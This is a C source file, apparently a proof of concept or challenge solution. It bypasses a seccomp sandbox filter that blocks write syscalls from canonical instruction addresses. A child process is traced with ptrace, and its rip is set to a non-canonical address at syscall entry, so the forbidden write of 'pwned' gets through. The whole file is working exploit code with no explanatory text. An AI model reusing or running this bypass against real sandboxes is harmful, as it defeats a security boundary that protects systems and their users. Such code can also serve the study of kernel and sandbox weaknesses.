#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <linux/ptrace.h>
#include <err.h>
#include <sys/uio.h>
#include <linux/elf.h>
#include <sys/user.h>
#include <string.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <stddef.h>

// Define the target address range
#define TARGET_START 0x000000000000
#define TARGET_END   0x800000000000

#define HIGH(X) ((X >> 32) & ((1 << 32) - 1))
#define LOW(X)  (X & ((1 << 32) - 1))

void install_seccomp_filter() {
    struct sock_filter filter[] = {
        // rip check
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, instruction_pointer) + 4),
        BPF_JUMP(BPF_JMP | BPF_JGE | BPF_K, HIGH(TARGET_END), 2, 0),
        
        // filter write syscall if it's called in a canonical address
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_write, 1, 0),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS)
        
    };

    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
        .filter = filter,
    };

    // Apply the seccomp filter
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
        perror("prctl(PR_SET_NO_NEW_PRIVS) failed");
        exit(EXIT_FAILURE);
    }

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog) != 0) {
        perror("prctl(PR_SET_SECCOMP) failed");
        exit(EXIT_FAILURE);
    }
}

void null(int a, void* b, int c){}

void trigger_sysret_bug()
{
    struct user_regs_struct regs;
    int status;

    pid_t chld;

    install_seccomp_filter();
    
    if ((chld = fork()) < 0) {
        perror("fork");
        exit(1);
    }

    if (chld == 0) {
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) {
            perror("PTRACE_TRACEME");
            exit(1);
        }
        
        __asm__ __volatile__ ("int3\n");

        const char *s = "pwned";

        __asm__ __volatile__ (
            ".intel_syntax noprefix\n"
            "mov rax, 1\n"
            "mov rdi, 1\n"
            "mov rsi, %0\n"
            "mov rdx, 5\n"
            "syscall\n"
            ".att_syntax prefix\n"
            :
            : "r"(s)
            : "rax", "rdi", "rsi", "rdx"
        );
        
        
        
        exit(0);

    }
    
    // wait for int3 to be executed
    waitpid(chld, &status, 0);
    ptrace(PTRACE_SYSCALL, chld, 0, 0);

    // wait for syscall entry
    waitpid(chld, &status, 0);

    // get the current register values and set rip to a non canonical address
    // to bypass the seccomp check on rip
    ptrace(PTRACE_GETREGS, chld, NULL, &regs);    
    regs.rip = 0xdeadbeefcafebabe;

    // set the new registers
    ptrace(PTRACE_SETREGS, chld, NULL, &regs);

    // continue execution (after the syscall the child will die and raise a SIGSEGV)
    ptrace(PTRACE_CONT, chld, 0, 0);
    ptrace(PTRACE_DETACH, chld, 0, 0);


    exit(0);
}



__attribute__((constructor)) 
void init(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    setbuf(stdin, NULL);
}

int main(){
    trigger_sysret_bug();
    return 0;
}